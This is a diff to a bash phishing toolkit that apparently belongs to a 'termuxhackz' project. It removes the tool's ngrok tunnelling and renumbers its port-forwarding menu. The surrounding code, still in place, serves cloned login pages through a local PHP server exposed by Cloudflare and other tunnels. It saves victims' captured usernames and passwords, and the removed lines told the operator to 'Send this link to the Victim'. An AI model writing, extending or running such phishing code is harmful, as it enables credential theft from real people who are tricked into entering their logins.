@@ -112,7 +112,6 @@ UWhite='\033[4;37m'       # White
                 #command -v unzip > /dev/null 2>&1 || { echo >&2 "${Red}Installing unzip."; apt-get install wget -y; exit 1; }
                 #command -v curl > /dev/null 2>&1 || { echo >&2 "${Red}Installing curl."; apt-get install curl -y; exit 1; }
                 #command -v lt > /dev/null 2>&1 || { echo >&2 "${Red}Installing localtunnel."; apt-get install npm -y; sleep 2; npm install -g localtunnel;  exit 1; }
-                #command -v ngrok > /dev/null 2>&1 || { echo >&2 "${Red}Download NGROK from Official site."; exit 1; }
                 #printf "\n"
                 #printf "${BGreen}Version ${version}"
                 exit 0
@@ -647,12 +646,7 @@ fi
 }
 stop() {
 
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
@@ -790,7 +784,6 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 killall -2 php > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
 exit 1
 
 }
@@ -906,50 +899,9 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-
-if [[ -e ngrok ]]; then
-echo ""
-else
-
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
-unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-
-
-
-else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
-chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-fi
-fi
-
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-./ngrok http 5555 > /dev/null 2>&1 &
-sleep 5
-
-link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
 checkfound() {
@@ -995,7 +947,6 @@ start_cloudflared3() {
 	cldflr_link1=${cldflr_link#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
-	echo -e "\n If you are getting ngrok Tunnel Error in the above links, please wait at least 1 minute for the site to come online.\n"
 	echo -e "\n if you do not see any link kindly report to me at AnonyminHack5@protonmail.com.\n"
 	datafound
 }
@@ -1078,14 +1029,12 @@ cp -f sites/ip.php .termuxhackz/www/
 
 def_tunnel_menu="2"
 smallbanner
-printf "\e[1;93m[\e[0m\e[1;94m!\e[0m\e[1;93m]\e[0m Kindly turn on your device hotspot and select Ngrok from the ports below \e[1;93m[\e[0m\e[1;94m!\e[0m\e[1;93m]\e[0m\n\n"
 printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[93m LocalHost\e[0m\n"
-printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Ngrok\e[0m\n"
-printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m Serveo \e[0m\e[91m[\e[0m\e[93mCurrently Down\e[0m\e[91m]\e[0m\n"
-printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
-printf "\e[0m\e[91m [\e[0m05\e[0m\e[91m]\e[0m\e[93m LocalHostRun\e[0m\n"
-printf "\e[0m\e[91m [\e[0m06\e[0m\e[91m]\e[0m\e[93m CloudFlare  1 \e[0m\e[91m[\e[0m\e[93mNEW - LINUX ONLY - BUGS MAY BE ENCOUNTERED \e[0m\e[91m]\e[0m\n"
-printf "\e[0m\e[91m [\e[0m07\e[0m\e[91m]\e[0m\e[93m CloudFlare 2 \e[0m\e[91m[\e[0m\e[93mNEW - TERMUX ONLY - BUGS MAY BE ENCOUNTERED \e[0m\e[91m]\e[0m\n"
+printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[93m Serveo \e[0m\e[91m[\e[0m\e[93mCurrently Down\e[0m\e[91m]\e[0m\n"
+printf "\e[0m\e[91m [\e[0m03\e[0m\e[91m]\e[0m\e[93m LocalXpose\e[0m\n"
+printf "\e[0m\e[91m [\e[0m04\e[0m\e[91m]\e[0m\e[93m LocalHostRun\e[0m\n"
+printf "\e[0m\e[91m [\e[0m05\e[0m\e[91m]\e[0m\e[93m CloudFlare  1 \e[0m\e[91m[\e[0m\e[93mNEW - LINUX ONLY - BUGS MAY BE ENCOUNTERED \e[0m\e[91m]\e[0m\n"
+printf "\e[0m\e[91m [\e[0m06\e[0m\e[91m]\e[0m\e[93m CloudFlare 2 \e[0m\e[91m[\e[0m\e[93mNEW - TERMUX ONLY - BUGS MAY BE ENCOUNTERED \e[0m\e[91m]\e[0m\n"
 printf "\e[0m\e[91m [\e[0m00\e[0m\e[91m]\e[0m\e[93m Go Back\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' tunnel_menu
@@ -1094,16 +1043,14 @@ tunnel_menu="${tunnel_menu:-${def_tunnel_menu}}"
 if [[ $tunnel_menu == 1 || $tunnel_menu == 01 ]]; then
 start_localhost
 elif [[ $tunnel_menu == 2 || $tunnel_menu == 02 ]]; then
-start_ngrok
-elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
 start_serveo
-elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
+elif [[ $tunnel_menu == 3 || $tunnel_menu == 03 ]]; then
 start_loclx
-elif [[ $tunnel_menu == 5 || $tunnel_menu == 05 ]]; then
+elif [[ $tunnel_menu == 4 || $tunnel_menu == 04 ]]; then
 start_localhostrun
-elif [[ $tunnel_menu == 6 || $tunnel_menu == 06 ]]; then
+elif [[ $tunnel_menu == 5 || $tunnel_menu == 05 ]]; then
 start_cloudflare
-elif [[ $tunnel_menu == 7 || $tunnel_menu == 07 ]]; then
+elif [[ $tunnel_menu == 6 || $tunnel_menu == 06 ]]; then
 start_cloudflare2
 elif [[ $tunnel_menu == 00 || $tunnel_menu == 0 ]]; then
 go_back
@@ -1145,26 +1092,6 @@ printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted 
 
 datafound
 
-}
-
-start_ngrok() {
-
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:5555\e[0m\e[1;91m )\e[0m\n"
-sleep 1
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ...\e[0m\n"
-cd .termuxhackz/www && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
-sleep 1
-./.termuxhackz/ngrok http 127.0.0.1:5555 > /dev/null 2>&1 &
-sleep 4
-ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-
-smallbanner
-printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim:\e[0m\e[1;93m %s \n" $ngrok_link
-
-datafound
 }
 
 start_serveo() {
